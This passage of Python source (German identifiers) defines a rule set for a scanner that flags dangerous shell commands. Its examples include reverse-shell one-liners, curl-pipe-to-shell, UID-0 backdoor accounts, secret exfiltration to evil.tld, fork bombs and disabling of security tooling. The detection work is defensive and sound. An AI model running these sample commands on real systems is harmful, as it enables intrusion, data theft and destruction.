      r"/etc/(?:passwd|shadow|group|gshadow|sudoers|fstab|crypttab)\b",
      None, "etc", ("/etc/",),
      ("echo x > /etc/passwd", "cp /dev/null /etc/shadow"),
      ("echo x >> /etc/hosts", "cat /etc/passwd")),
    R("PKG-CRITICAL", ROT, "System",
      "Paketmanager entfernt essenzielle Pakete oder erzwingt Entfernung",
      B + r"(apt-get|apt|aptitude|dnf|yum|zypper|pacman|rpm|dpkg)\s+([^;&|\n`]*)",
      _paket_rot, "paket", ("apt", "dnf", "yum", "zypper", "pacman", "rpm", "dpkg"),
      ("apt-get remove --purge libc6",), ("apt-get remove firefox",)),
    R("USERDEL-ROOT", ROT, "System",
      "root-Konto löschen",
      B + r"userdel\s+(?:-\S+\s+)*root\b", None, "konto", ("userdel",),
      ("userdel -r root",), ("userdel -r gast",)),
    R("ROOT-ACCOUNT", ROT, "Hintertür",
      "Zusätzliches Konto mit UID 0 (zweites root) oder Eintrag direkt in passwd/shadow",
      B + r"(?:useradd|adduser|usermod)\b(?=[^\n;|&]*\s(?:-o|--non-unique)\b)"
      r"(?=[^\n;|&]*\s(?:-u|--uid)\s*0\b)|>>\s*[\"']?/etc/(?:passwd|shadow)\b|"
      + B + r"echo\s+[\"']?[^:\s\"']+:[^:\n]*:0:0:",
      None, "konto", ("useradd", "adduser", "usermod", "/etc/passwd", "/etc/shadow", ":0:0:"),
      ("useradd -o -u 0 hintertuer", "echo 'x::0:0::/root:/bin/bash' >> /etc/passwd"),
      ("useradd -m gast", "cat /etc/passwd")),
    R("ACCOUNT-LOCK", GELB, "System",
      "Konto sperren oder Passwort entfernen - Aussperren oder offenes Konto",
      B + r"(?:passwd\s+(?:-d|--delete|-l|--lock)\b|usermod\s+(?:-L|--lock)\s+root\b)",
      None, "konto", ("passwd", "usermod"),
      ("passwd -d nutzer", "usermod -L root"), ("passwd",)),
    R("CHPASSWD", GELB, "System",
      "Passwort per Befehl setzen - Klartext-Passwort im Skript",
      B + r"(?:chpasswd\b|passwd\s+--stdin\b|usermod\b[^\n;|&]*\s(?:-p|--password)\s)",
      None, "konto", ("passwd", "usermod"),
      ("echo 'root:geheim' | chpasswd",), ("passwd",)),
    R("EFIBOOT", GELB, "System",
      "UEFI-Booteintrag löschen",
      B + r"efibootmgr\b[^\n;]*\s(?:-B|--delete-bootnum)\b", None, "boot", ("efibootmgr",),
      ("efibootmgr -b 0001 -B",), ("efibootmgr -v",)),
    R("SYSRQ", GELB, "System",
      "SysRq-Trigger - sofortiger Absturz/Reboot ohne Sync (Datenverlust)",
      r">\s*[\"']?/proc/sysrq-trigger", None, "sysrq", ("sysrq",),
      ("echo b > /proc/sysrq-trigger",), ("cat /proc/sys/kernel/sysrq",)),
    R("KILL-ALL", GELB, "System",
      "Alle Prozesse bzw. init hart beenden",
      B + r"(?:kill\s+(?:-9|-KILL|-SIGKILL|-s\s+KILL)\s+(?:-1|1)\b|killall5\b)",
      None, "kill", ("kill",), ("kill -9 -1",), ("kill -9 12345",)),
    R("SHUTDOWN", GELB, "System",
      "System herunterfahren oder neu starten",
      B + r"(?:(?:shutdown|poweroff|halt|reboot)(?=\s*(?:$|[;&|)]|[-/]\w|now\b|\+\d))|"
      r"systemctl\s+(?:-\S+\s+)*(?:poweroff|reboot|halt|kexec)\b|(?:tel)?init\s+[06](?=\s*(?:$|[;&|])))",
      None, "shutdown", ("shutdown", "poweroff", "halt", "reboot", "init", "kexec"),
      ("shutdown -h now", "sudo reboot", "systemctl poweroff", "init 0", "shutdown /s /t 0"),
      ("Das ist halt so.", "Nach dem reboot prüfen.", "systemctl status")),
    R("TRUNCATE", GELB, "System",
      "Datei auf 0 Byte kürzen",
      B + r"truncate\s+(?:-\S+\s+)*(?:-s\s*0|--size=?0)\b", None, "truncate", ("truncate",),
      ("truncate -s 0 /var/lib/db.sqlite",), ("truncate -s 10G disk.img",)),
    R("CRONTAB-R", GELB, "System",
      "crontab -r löscht alle Cronjobs des Benutzers ohne Rückfrage",
      B + r"crontab\s+(?:-\S+\s+)*-r\b", None, "cron", ("crontab",),
      ("crontab -r",), ("crontab -l",)),

    # ---- Endlosprozesse -------------------------------------------------------
    R("FORKBOMB", ROT, "Ressourcen",
      "Fork-Bombe - erzeugt Prozesse bis das System einfriert",
      r"(?::\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;?\s*:|"
      r"\b(\w+)\s*\(\s*\)\s*\{\s*\1\s*\|\s*\1\s*&|fork\s+while\s+fork)",
      None, "fork", ("{", "fork"), (":(){ :|:& };:",), ("f() { echo hallo; }",)),

    # ---- Fremdcode & Verschleierung -------------------------------------------
    R("PIPE-SHELL", ROT, "Fremdcode",
      "Code aus dem Netz wird ungeprüft direkt ausgeführt (curl/wget | sh)",
      B + r"(?:curl|wget|fetch)\b[^\n;]*?\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:env\s+\S+\s+)?"
      r"(?:/\S*/)?(?:(?:ba|z|da|k|fi)?sh|python3?|perl|ruby)\b", None, "remote",
      ("curl", "wget", "fetch"),
      ("curl -fsSL https://x.tld/i.sh | sudo bash",), ("curl -o i.sh https://x.tld/i.sh",)),
    R("SUBST-SHELL", ROT, "Fremdcode",
      "Shell führt heruntergeladenen Inhalt aus (bash <(curl ...) / sh -c \"$(curl ...)\")",
      r"(?:ba|z|da)?sh\s+(?:-\S+\s+)*[\"']?(?:\$\(|<\(|`)\s*(?:curl|wget)\b",
      None, "remote", ("curl", "wget"),
      ("bash <(curl -s https://x.tld/i.sh)",), ("bash ./i.sh",)),
    R("PS-REMOTE", ROT, "Fremdcode",
      "PowerShell führt Code aus dem Netz aus (iex + Download)",
      r"(?i)(?P<iex>\b(?:iex|Invoke-Expression)\b)|(?P<laden>\b(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b)",
      None, "remote", ("iex", "invoke-expression"),
      ("iex (iwr https://x.tld/a.ps1)", "IEX (New-Object Net.WebClient).DownloadString('https://x.tld/a')",
       "irm https://x.tld/a | iex"),
      ("iwr https://x.tld/a -OutFile a.zip",),
      danach={"iex": r"(?i:\b(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod|"
                     r"DownloadString|DownloadFile|Net\.WebClient)\b)",
              "laden": r"\|\s*(?i:iex|Invoke-Expression)\b"}),
    R("DECODE-SHELL", ROT, "Verschleierung",
      "Dekodierter/entpackter Inhalt wird direkt ausgeführt (base64 -d | sh ...)",
      B + r"(?:base64|xxd|openssl|gunzip|zcat|rev)\b[^\n;]*\|\s*(?:sudo\s+)?"
      r"(?:ba|z|da)?sh\b", None, "obfusc", ("base64", "xxd", "openssl", "gunzip", "zcat", "rev"),
      ("echo cm0gLXJmIC8= | base64 -d | bash",), ("base64 -d datei.b64 > datei",)),
    R("EVAL", GELB, "Verschleierung",
      "eval/exec auf dynamisch erzeugtem oder dekodiertem Inhalt",
      r"(?:" + B + r"eval\s+[\"']?\$\(|\b(?:exec|eval)\s*\(\s*(?:base64\.b64decode|"
      r"codecs\.decode|zlib\.decompress|bytes\.fromhex|__import__))", None, "eval", ("eval", "exec"),
      ('eval "$(curl -s x)"', "exec(base64.b64decode(s))"), ('eval "$ssh_agent_cmd"',)),
    R("B64-BLOB", GELB, "Verschleierung",
      "Langer Base64-Block wird dekodiert - Inhalt manuell prüfen",
      r"(?<![A-Za-z0-9+/])[A-Za-z0-9+/]{40,}={0,2}[\"']?\s*\|\s*base64\s+(?:-d|--decode|-D)\b",
      None, "b64", ("base64",),
      ("echo " + "QUFB" * 12 + " | base64 -d",), ("echo aGFsbG8= | base64 -d",)),
    R("PS-ENC", GELB, "Verschleierung",
      "PowerShell mit kodiertem Befehl (-EncodedCommand) - Inhalt prüfen",
      r"(?i)\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]*\s-(?:e|ec|enc|encodedcommand)\s+[A-Za-z0-9+/=]{16,}",
      None, "psenc", ("powershell", "pwsh"),
      ("powershell -enc SQBFAFgAIAAoAGkAdwByACkA",), ("powershell -File skript.ps1",)),

    # ---- Aussperren & Schutz abschalten ---------------------------------------
    R("FW-FLUSH", GELB, "Netzwerk",
      "Firewall-Regeln leeren oder Policy auf DROP - Aussperren möglich",
      B + r"(?:ip6?tables\s+(?:-t\s+\w+\s+)?(?:-F|--flush)\b|ip6?tables\s+(?:-P|--policy)\s+"
      r"(?:INPUT|OUTPUT)\s+DROP\b|nft\s+flush\s+ruleset\b|ufw\s+reset\b)",
      None, "netz", ("iptables", "nft", "ufw"),
      ("nft flush ruleset", "iptables -F"), ("nft list ruleset",)),
    R("NET-DOWN", GELB, "Netzwerk",
      "SSH-/Netzwerkdienst stoppen oder Interface abschalten (Fernzugriff weg)",
      B + r"(?:systemctl\s+(?:-\S+\s+)*(?:stop|disable|mask|kill)\s+[^\n;&|]*\b(?:sshd?|"
      r"networking|NetworkManager|systemd-networkd|wpa_supplicant)\b|ip\s+link\s+set\s+\S+\s+"
      r"down\b|ifdown\b)", None, "netz", ("systemctl", "link", "ifdown"),
      ("systemctl stop sshd", "ip link set eth0 down"), ("systemctl status sshd",)),
    R("SEC-OFF", GELB, "Sicherheit",
      "SELinux/AppArmor/Firewall/Proxy/Audit abschalten",
      B + r"(?:setenforce\s+0\b|aa-teardown\b|systemctl\s+(?:-\S+\s+)*(?:stop|disable|mask|kill)\s+"
      r"[^\n;&|]*\b(?:apparmor|firewalld|ufw|nftables|iptables|squid|auditd|fail2ban)\b|"
      r"ufw\s+disable\b)", None, "sicherheit", ("setenforce", "aa-teardown", "systemctl", "ufw"),
      ("setenforce 0", "systemctl disable --now nftables"), ("systemctl restart nginx",)),
    R("WIN-SEC-OFF", GELB, "Sicherheit",
      "Windows-Schutz abschalten (Defender, Firewall, UAC)",
      r"(?i)Set-MpPreference\b[^\n]*-Disable\w+\s+(?:\$true|1)\b|Add-MpPreference\b[^\n]*-Exclusion|"
      r"netsh\s+(?:adv)?firewall\s+[^\n]*\b(?:state\s+off|opmode\s+disable)|EnableLUA\b[^\n]*\b0\b",
      None, "sicherheit", ("mppreference", "netsh", "enablelua"),
      ("Set-MpPreference -DisableRealtimeMonitoring $true", "netsh advfirewall set allprofiles state off"),
      ("Get-MpPreference",)),
    R("SUDO-WEAK", GELB, "Sicherheit",
      "sudo ohne Passwort bzw. direktes Anhängen an /etc/sudoers",
      r"(?:NOPASSWD\s*:\s*ALL|>>\s*[\"']?/etc/sudoers\b)", None, "sicherheit", ("nopasswd", "sudoers"),
      ("echo 'u ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",), ("visudo -c",)),
    R("SSHD-WEAK", GELB, "Sicherheit",
      "SSH-Server wird geschwächt (root-Login, Passwort-Login, leere Passwörter)",
      r"(?i)\b(?:PermitRootLogin\s+yes|PermitEmptyPasswords\s+yes|PasswordAuthentication\s+yes|"
      r"StrictModes\s+no)\b", None, "sshd", ("permit", "passwordauthentication", "strictmodes"),
      ("echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config", "PasswordAuthentication yes"),
      ("PermitRootLogin no",)),
    R("LOG-WIPE", GELB, "Spuren",
      "Logs/History löschen - typisch für Spurenverwischung",
      r"(?:" + B + r"history\s+-c\b|unset\s+HISTFILE\b|HISTFILE=/dev/null|"
      r"(?<!>)>\s*[\"']?/var/log/|" + B + r"(?:rm|shred)\b[^\n;]*\s[\"']?/var/log/)",
      None, "spuren", ("history", "histfile", "/var/log"),
      ("history -c", "rm -rf /var/log/journal"), ("tail -f /var/log/syslog",)),

    # ---- Virtualisierung & Zonentrennung --------------------------------------
    R("VIRT-STORAGE", ROT, "Virtualisierung",
      "VM oder Volume samt Speicher löschen (undefine --remove-all-storage, vol-delete, vol-wipe)",
      B + r"virsh\b[^\n;|&]*\b(?:undefine\b[^\n;|&]*--(?:remove-all-storage|wipe-storage|storage)\b|"
      r"vol-(?:delete|wipe)\b)", None, "virt", ("virsh",),
      ("virsh undefine vm-fw --remove-all-storage",), ("virsh undefine vm-fw",)),
    R("VIRT-NET", GELB, "Virtualisierung",
      "Netz- oder Geräteanbindung einer VM ändern - kann eine Zonentrennung aufheben",
      B + r"virsh\b[^\n;|&]*\b(?:attach-interface|detach-interface|attach-device|detach-device|"
      r"attach-disk|detach-disk|update-device|domif-setlink|net-define|net-update|net-destroy|"
      r"net-undefine)\b", None, "virt", ("virsh",),
      ("virsh attach-interface vm-orch network net-egress --config",), ("virsh domiflist vm-fw",)),
    R("VIRT-STATE", GELB, "Virtualisierung",
      "VM hart beenden, entfernen, umdefinieren oder auf Snapshot zurücksetzen",
      B + r"virsh\b[^\n;|&]*\b(?:destroy|undefine|define|edit|restore|snapshot-revert|"
      r"snapshot-delete)\b", None, "virt", ("virsh",),
      ("virsh destroy vm-fw",), ("virsh list --all",)),

    # ---- Firewall, Namensauflösung, Konfiguration ------------------------------
    R("FW-CHANGE", GELB, "Netzwerk",
      "Firewall-Regel hinzufügen/ändern/löschen oder Regelsatz laden - Freigabe prüfen",
      B + r"(?:nft\s+(?:-\S+\s+)*(?:add|insert|replace|delete|destroy|create)\s+"
      r"(?:rule|chain|table|set|element|map)\b|nft\s+(?:-\S+\s+)*-f\b|"
      r"ip6?tables\s+(?:-t\s+\w+\s+)?-[AIDR]\b|ufw\s+(?:allow|delete)\b|"
      r"firewall-cmd\b[^\n;]*--(?:add|remove)-)", None, "fw", ("nft", "iptables", "ufw", "firewall-cmd"),
      ("nft add rule inet filter forward accept", "iptables -A INPUT -j ACCEPT"), ("nft list ruleset",)),
    R("DNS-SET", GELB, "Netzwerk",
      "Namensauflösung ändern (resolv.conf) - kann einen Abfluss über DNS öffnen",
      _SCHREIB + r"/etc/resolv\.conf\b", None, "dns", ("resolv.conf",),
      ("echo 'nameserver 1.1.1.1' > /etc/resolv.conf",), ("cat /etc/resolv.conf",)),
    R("CONF-EDIT", GELB, "Sicherheit",
      "Sicherheitsrelevante Konfiguration wird direkt verändert (sed -i auf squid/nftables/ssh/sudoers/pam)",
      B + r"sed\s+(?:-\S+\s+)*-i\S*[^\n;|&]*(?:/etc/(?:squid|nftables|ssh|sudoers|pam\.d|libvirt)\b|"
      r"sshd_config\b)", None, "konf", ("sed",),
      ("sed -i 's/deny/allow/' /etc/squid/squid.conf",), ("sed -n 1p /etc/squid/squid.conf",)),
    R("GROUP-PRIV", GELB, "Sicherheit",
      "Konto erhält eine privilegierte Gruppe (sudo, wheel, libvirt, kvm, docker, root, adm, disk)",
      B + r"(?:usermod|gpasswd|adduser|useradd)\b[^\n;|&]*\b(?:sudo|wheel|libvirt|kvm|docker|root|"
      r"adm|disk|shadow)\b", None, "gruppe", ("usermod", "gpasswd", "adduser", "useradd"),
      ("usermod -aG sudo nutzer",), ("usermod -aG laborleser nutzer",)),

    # ---- Hintertür, Persistenz & Abfluss ---------------------------------------
    R("SSH-KEY", ROT, "Hintertür",
      "SSH-Schlüssel wird in authorized_keys eingetragen - dauerhafter Zugang",
      r"(?:(?:>>?|" + B + r"tee\s+(?:-\S+\s+)*)\s*[\"']?\S*authorized_keys2?\b|" + B + r"ssh-copy-id\b)",
      None, "ssh", ("authorized_keys", "ssh-copy-id"),
      ("echo key >> ~/.ssh/authorized_keys", "ssh-copy-id nutzer@host"), ("cat ~/.ssh/authorized_keys",)),
    R("REVERSE-SHELL", ROT, "Hintertür",
      "Rückverbindung (Reverse Shell): eine Shell wird an eine Netzverbindung gebunden",
      r"(?:>&|&>|<&)\s*/dev/(?:tcp|udp)/|/dev/(?:tcp|udp)/\S+\s+0>&1|"
      + B + r"(?:nc|ncat|netcat)\b[^\n;|&]*\s(?:-e|-c|--exec|--sh-exec|--lua-exec)\b|"
      + B + r"socat\b[^\n;]*\b(?:exec|system):|"
      + B + r"mkfifo\b[^\n]*\|\s*(?:nc|ncat|netcat|openssl\s+s_client|telnet)\b|"
      r"socket\.socket\([^\n]*\b(?:dup2|pty\.spawn|subprocess)|"
      r"fsockopen\s*\([^\n]*\b(?:exec|system|proc_open|shell_exec|passthru|/bin/(?:ba)?sh)|"
      r"TCPSocket\.(?:new|open)\([^\n]*(?:exec|spawn|/bin/(?:ba)?sh)|"
      r"Net\.Sockets\.TCPClient\b[^\n]*(?:iex|Invoke-Expression|GetStream)",
      None, "revshell", ("/dev/tcp", "/dev/udp", "nc", "socat", "mkfifo", "socket", "fsockopen",
                         "tcpsocket", "tcpclient"),
      ("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "nc -e /bin/sh 1.2.3.4 4444",
       "socat tcp:1.2.3.4:4444 exec:/bin/sh",
       "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 1.2.3.4 4444 > /tmp/f"),
      ("nc -zv host 22", "socat - tcp:host:80")),
    R("NET-DEVTCP", GELB, "Hintertür",
      "Netzverbindung über /dev/tcp bzw. /dev/udp (Port-Test oder Datenkanal)",
      r"/dev/(?:tcp|udp)/", None, "revshell", ("/dev/tcp", "/dev/udp"),
      ("timeout 1 bash -c '</dev/tcp/host/22'",), ("ls /dev",)),
    R("PRELOAD", ROT, "Hintertür",
      "Bibliothek wird systemweit in jeden Prozess geladen (/etc/ld.so.preload)",
      _KOPIER + r"/etc/ld\.so\.preload\b", None, "preload", ("preload",),
      ("echo /tmp/x.so > /etc/ld.so.preload",), ("cat /etc/ld.so.preload",)),
    R("LD-PRELOAD", GELB, "Hintertür",
      "LD_PRELOAD wird gesetzt - fremde Bibliothek wird in Prozesse geladen",
      r"(?<![\w$])LD_PRELOAD=\S", None, "preload", ("preload",),
      ("export LD_PRELOAD=/tmp/x.so", "LD_PRELOAD=/tmp/x.so ls"), ("echo $LD_PRELOAD",)),
    R("PERSIST-RC", GELB, "Hintertür",
      "Shell-Startdatei wird verändert (läuft bei jeder Anmeldung)",
      _SCHREIB + r"(?:(?:~|\$HOME|\$\{HOME\}|/root|/home/[^/\s]+)/)?\.(?:bashrc|bash_profile|bash_login|"
      r"bash_logout|profile|zshrc|zprofile|zshenv|config/fish/config\.fish)\b|"
      + _SCHREIB + r"/etc/(?:profile|bash\.bashrc|zsh/zshrc|environment|rc\.local)\b|"
      + _SCHREIB + r"/etc/profile\.d/",
      None, "persist", (">", "tee"),
      ("echo 'curl x | sh' >> ~/.bashrc", "echo '' > ~/.bashrc", "tee -a /etc/profile.d/x.sh"),
      ("cat ~/.bashrc", "source ~/.bashrc")),
    R("PERSIST-CRON", GELB, "Hintertür",
      "Cronjob anlegen (dauerhafte, zeitgesteuerte Ausführung)",
      r"\|\s*(?:sudo\s+)?crontab\b(?!\s+-[lr]\b)|" + B + r"crontab\s+(?:-u\s+\S+\s+)?(?!-)[\"']?[\w./~-]+|"
      + _KOPIER + r"/(?:etc/cron(?:tab\b|\.d/|\.hourly|\.daily|\.weekly|\.monthly)|var/spool/cron)",
      None, "persist", ("cron",),
      ("echo '* * * * * /tmp/x' | crontab -", "echo '@reboot root /tmp/x' >> /etc/crontab",
       "cp job /etc/cron.d/job"),
      ("crontab -l", "crontab -r")),
    R("PERSIST-SYSTEMD", GELB, "Hintertür",
      "systemd-Unit-Datei wird angelegt (Dienst läuft dauerhaft, nach Aktivierung auch nach Neustart)",
      _KOPIER +
      r"(?:/etc/systemd/system|/lib/systemd/system|/usr/lib/systemd/system|~/\.config/systemd/user)/",
      None, "persist", ("systemctl", "systemd"),
      ("cp boese.service /etc/systemd/system/", "tee /etc/systemd/system/x.service"),
      ("systemctl enable --now nftables", "cat /etc/systemd/system/x.service")),
    R("EXFIL-SECRET", ROT, "Abfluss",
      "Schlüssel-, Token- oder Passwortdatei wird ins Netz gesendet",
      r"(?P<werkzeug>" + B + r"(?:" + NETZ + r"|scp|rsync|sftp)\b)|(?P<geheim>" + GEHEIM + r")",
      None, "abfluss", NETZ_WORTE + ("scp", "rsync", "sftp"),
      ("scp ~/.ssh/id_rsa evil.tld:", "cat api_key.txt | nc evil.tld 80", "tar czf - ~/.ssh | curl -T - https://x.tld"),
      ("curl -s https://example.com/", "mkdir -p ~/.ssh; curl -fsSL https://x.tld/a.sh -o a.sh"),
      danach={"werkzeug": GEHEIM, "geheim": r"\|\s*" + NETZ + r"\b"}),
    R("EXFIL-UPLOAD", GELB, "Abfluss",
      "Datei oder Befehlsausgabe wird ins Netz gesendet (Upload, Pipe, Kommandosubstitution in der Adresse)",
      r"(?:" + B + r"curl\b[^\n;]*(?:\s(?:-d|--data(?:-binary|-raw|-urlencode)?|-F|--form)\b[^\n;]*@|"
      r"\s(?:-T|--upload-file)\b|https?://[^\s\"']*(?:\$\(|`))|"
      + B + r"wget\b[^\n;]*(?:--post-file|--body-file|https?://[^\s\"']*(?:\$\(|`))|"
      + B + r"(?:scp|rsync|sftp)\b[^\n;]*\s[\w.@-]+:[^\s/]*|\|\s*" + NETZ + r"\b)", None, "abfluss",
      NETZ_WORTE + ("scp", "rsync", "sftp"),
      ("curl -T datei.tar https://x.tld/", "tar c . | nc x.tld 80"), ("curl -o datei https://x.tld/",)),

    # ---- Inline-Code & Nachladen -----------------------------------------------
    R("INLINE-CODE", GELB, "Verschleierung",
      "Interpreter mit Inline-Code (-c/-e) - Inhalt manuell prüfen",
      B + r"(?:(?:python[0-9.]*|perl|ruby|node|php|lua)\s+(?:-\S+\s+)*-[ce]\b|"
      r"(?:ba|z|da|k)?sh\s+(?:-\S+\s+)*-c\b)", None, "inline",
      ("python", "perl", "ruby", "node", "php", "lua", "sh"),
      ('python3 -c "print(1)"', "bash -c 'ls'"), ("python3 skript.py",)),
    R("PY-SHELL", GELB, "Verschleierung",
      "Shell-Aufruf mit zusammengesetztem Befehl (os.system/popen mit Ausdruck, shell=True) - prüfen",
      r"\b(?:os\.(?:system|popen)|commands\.getoutput|subprocess\.(?:getoutput|getstatusoutput))"
      r"\(\s*(?![rbuRBU]?([\"'])[^\"'{}%]*\1\s*\))|\bshell\s*=\s*True\b",
      None, "pyshell", ("os.system", "os.popen", "getoutput", "shell"),
      ("os.system(befehl)", "subprocess.run(cmd, shell=True)", "os.popen(f'ls {x}')"),
      ("os.system('ls -la')", "subprocess.run(['ls', '-la'])")),
    R("JS-EXEC", GELB, "Verschleierung",
      "exec/execSync auf zusammengesetztem Inhalt oder spawn mit shell: true - prüfen",
      r"(?:(?<![\w.])|child_process\.)(?:exec|execSync)\(\s*(?!([\"'])[^\"'`$+]*\1\s*[,)])|"
      r"\bshell\s*:\s*true\b", None, "jsexec", ("exec", "shell"),
      ("execSync(befehl)", "child_process.exec(cmd)", "exec(code)", "spawn(cmd, {shell: true})"),
      ("regex.exec(text)", "execSync('ls -la')")),
    R("PKG-INSTALL", GELB, "Fremdcode",
      "Paket oder Image aus dem Netz installieren - Name und Quelle prüfen (Tippfehler-Pakete)",
      B + r"(?:pip[0-9.]*\s+install\b|npm\s+(?:install|i)\b|gem\s+install\b|cargo\s+install\b|"
      r"(?:apt-get|apt|dnf|yum|zypper)\s+(?:-\S+\s+)*install\b|pacman\s+-S\b|"
      r"(?:docker|podman)\s+pull\b)", None, "install", ("install", "pacman", "pull", "npm"),
      ("pip install requests", "docker pull alpine"), ("pip list",)),
    R("VAR-CMD", GELB, "Verschleierung",
      "Befehl wird in einer Variable abgelegt - Aufrufe über $VAR sind nur prüfbar, wenn der Wert feststeht",
      r"(?<![\w$])[A-Za-z_]\w*=[\"']?(?:(?:\$\(|`)\s*(?:command\s+-v|which|type\s+-[pP])\s+[\"']?)?"
      r"(?:/\S*/)?(?:rm|dd|shred|mkfs\S*|wipefs|chmod|chown|curl|wget|"
      r"nc|bash|sh|eval|virsh|nft)(?:[\"']?\s*(?:\)|`))?[\"']?(?=\s|;|$)", None, "varcmd", ("=",),
      ("X=rm", "CMD=/bin/rm", "X=$(command -v rm)", 'Y="`which shred`"'),
      ("X=hallo", "PY=$(command -v python3)")),
    R("LONG-LINE", GELB, "Verschleierung",
      f"Überlange Zeile - nur die ersten {MAX_ZEILE} Zeichen geprüft, Rest manuell prüfen",
      r"(?!)", None, "lang"),

    # ---- Container (Datenverlust) ---------------------------------------------
    R("DOCKER-VOL", GELB, "Container",
      "Docker/Podman-Volumes löschen - persistente Daten weg",
      B + r"(?:(?:docker|podman)\s+system\s+prune\b[^\n;]*--volumes|(?:docker|podman)\s+"
      r"volume\s+(?:rm|prune)\b|docker[\s-]compose\s+down\b[^\n;]*(?:\s-v\b|--volumes))",
      None, "docker", ("docker", "podman"),
      ("docker volume rm daten", "docker system prune -a --volumes"), ("docker volume ls",)),
    R("DOCKER-RM-ALL", GELB, "Container",
      "Alle Container oder Images entfernen",
      B + r"(?:(?:docker|podman)\s+(?:container\s+|image\s+)?(?:rm|rmi|kill)\b[^\n;]*\$\(\s*(?:docker|podman)|"
      r"(?:docker|podman)\s+(?:system|container|image)\s+prune\b[^\n;]*(?:\s-a\b|--all\b))",
      None, "docker", ("docker", "podman"),
      ("docker rm -f $(docker ps -aq)", "docker image prune -a -f"), ("docker rm alt",)),
]


REGEL_LANG = next(r for r in REGELN if r.id == "LONG-LINE")


def trifft(regel: Regel, text: str, vorfilter: bool = True) -> bool:
    """Trifft die Regel allein (ohne Kontext und Gruppenauswahl) auf den Text zu?"""
    if vorfilter and regel.worte and not any(w in text.lower() for w in regel.worte):
        return False
    return next(stellen(regel, text), None) is not None


def pruefe_beispiele(regel: Regel) -> List[str]:
    fehler = [f"Beispiel trifft nicht: {b!r}" for b in regel.bsp if not trifft(regel, b)]
    fehler += [f"Beispiel trifft nur ohne Vorfilter (Wort fehlt): {b!r}" for b in regel.bsp
               if not trifft(regel, b) and trifft(regel, b, vorfilter=False)]
    fehler += [f"Gegenbeispiel trifft: {n!r}" for n in regel.nicht if trifft(regel, n)]
    return fehler


def selbsttest(regeln: List[Regel]) -> List[str]:
    meldungen = []
    for r in regeln:
        if r is REGEL_LANG:
            continue
        if not r.bsp:
            meldungen.append(f"{r.id}: keine Beispiele")
        meldungen += [f"{r.id}: {f}" for f in pruefe_beispiele(r)]
    ids = [r.id for r in regeln]
    meldungen += [f"{i}: Kennung doppelt" for i in sorted({i for i in ids if ids.count(i) > 1})]
    return meldungen


# --------------------------------------------------------------------------
# Dateitypen und logische Zeilen
# --------------------------------------------------------------------------
# Jede Zeile bekommt einen Dialekt, der bestimmt, wie Zitate, Kommentare und
# Befehlsgrenzen erkannt werden:
#   shell  Shell-Skripte, Konfiguration, unbekannte Textdateien, Code-Blöcke
#   python Python-Quelltext          js  JavaScript/TypeScript
#   ps     PowerShell                bat Windows-Batch
#   prosa  Markdown-Fließtext (nur Inline-Code `...` zählt als Befehl)
#   doku   Python-Docstring (nur Erwähnung)

TYPEN = ("auto", "shell", "python", "markdown", "js", "ps", "bat")
ENDUNGEN = {".py": "python", ".pyw": "python", ".md": "markdown", ".markdown": "markdown",
            ".mdx": "markdown", ".js": "js", ".mjs": "js", ".cjs": "js", ".ts": "js",
            ".tsx": "js", ".jsx": "js", ".ps1": "ps", ".psm1": "ps", ".psd1": "ps",
            ".bat": "bat", ".cmd": "bat"}
_SPRACHEN = {"python": "python", "py": "python", "python3": "python", "js": "js",
             "javascript": "js", "ts": "js", "typescript": "js", "node": "js", "jsx": "js",
             "tsx": "js", "powershell": "ps", "ps1": "ps", "pwsh": "ps", "ps": "ps",
             "bat": "bat", "cmd": "bat", "batch": "bat", "dos": "bat"}
_KONSOLE = {"console", "shell-session", "sh-session", "shellsession", "terminal"}
_FORTSETZUNG = {"shell": "\\", "python": "\\", "js": "\\", "ps": "`", "bat": "^"}
_ZAUN = re.compile(r"^\s{0,3}(`{3,}|~{3,})\s*([^\s`]*)")


def dateityp(pfad: str, text: str) -> str:
    ext = os.path.splitext(pfad)[1].lower()
    if ext in ENDUNGEN:
        return ENDUNGEN[ext]
    erste = text[:300].split("\n", 1)[0]
    if erste.startswith("#!"):
        if "python" in erste:
            return "python"
        if "node" in erste:
            return "js"
        if "pwsh" in erste or "powershell" in erste:
            return "ps"
    return "shell"


def _markdown(text: str):
    zaun, sprache, code_davor, leer_davor = None, "", False, True
    for nr, z in enumerate(text.splitlines(), 1):
        m = _ZAUN.match(z)
        if zaun is None and m:
            zaun, sprache = m.group(1), m.group(2).lower().strip("{}.")
            continue
        if zaun is not None:
            if m and m.group(1)[0] == zaun[0] and len(m.group(1)) >= len(zaun) and not m.group(2):
                zaun = None
                continue
            if sprache in _KONSOLE:
                z = re.sub(r"^\s*(?:\$|#|>|PS [^>]*>)\s+", "", z)
            else:
                z = re.sub(r"^\s*\$\s+", "", z)
            yield nr, z, _SPRACHEN.get(sprache, "shell")
            continue
        eingerueckt = z.startswith(("    ", "\t")) and z.strip()
        if eingerueckt and (leer_davor or code_davor):
            code_davor = True
            yield nr, z, "shell"
        else:
            code_davor = False
            yield nr, re.sub(r"^\s{0,3}(?:>\s?)+", "", z), "prosa"
        leer_davor = not z.strip()


_DOKU_EINZEILIG = re.compile(r"\s*[rRbBuU]?(\"\"\"|''').*\1\s*")


def _python(text: str):
    offen, doku = None, False
    for nr, z in enumerate(text.splitlines(), 1):
        if offen:
            yield nr, z, "doku" if doku else "shell"   # Inhalt mehrzeiliger Zeichenketten
            if offen in z:
                offen = None
            continue
        if _DOKU_EINZEILIG.fullmatch(z):
            yield nr, z, "doku"
            continue
        for q in ('"""', "'''"):
            if z.count(q) % 2 == 1:
                offen = q
                doku = bool(re.match(r"\s*[rRbBuU]?" + q, z))
                break
        yield nr, z, "doku" if offen and doku else "python"


def zeilen(text: str, typ: Optional[str]) -> Iterator[Tuple[int, str, str]]:
    """Liefert (Zeilennummer, logische Zeile, Dialekt); Fortsetzungszeilen zusammengefügt."""
    if typ == "markdown":
        quelle = _markdown(text)
    elif typ == "python":
        quelle = _python(text)
    else:
        d = typ if typ in ("js", "ps", "bat") else "shell"
        quelle = ((nr, z, d) for nr, z in enumerate(text.splitlines(), 1))
